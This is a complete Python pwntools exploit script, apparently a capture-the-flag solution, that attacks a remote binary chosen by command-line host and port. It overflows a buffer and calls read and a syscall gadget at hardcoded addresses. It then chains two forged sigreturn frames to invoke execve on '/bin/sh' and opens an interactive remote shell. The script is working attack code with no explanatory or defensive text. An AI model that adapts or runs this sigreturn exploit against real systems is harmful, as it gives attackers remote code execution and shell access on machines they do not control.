#!/usr/bin/env python
import time
import sys
from pwn import *
context.arch="amd64"

time_spacing = 0.1

r = remote(sys.argv[1], int(sys.argv[2]))
time.sleep(time_spacing)
padding = "PADDING!"*3

readplt = p64(0x401030)

bss = 0x404030
mid = 0x404500
main = 0x401040

syscall = 0x401054

frame = SigreturnFrame()
frame.rax = 59
frame.rip = main
frame.rsp = mid

payload = padding + readplt + p64(syscall) + str(frame)
print "sending frame 1"
r.sendline(payload)
time.sleep(time_spacing)

print "sending A"
r.send("A"*0xf) # 0xf sigreturn
time.sleep(time_spacing)

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = mid - 24
frame.rip = syscall
frame.rcx = 0x33

payload = padding + readplt + p64(syscall) + str(frame)
print "sending frame 2"
r.sendline(payload)
time.sleep(time_spacing)

print "sending binsh"
r.send("/bin/sh" + '\x00'*8)

r.interactive()
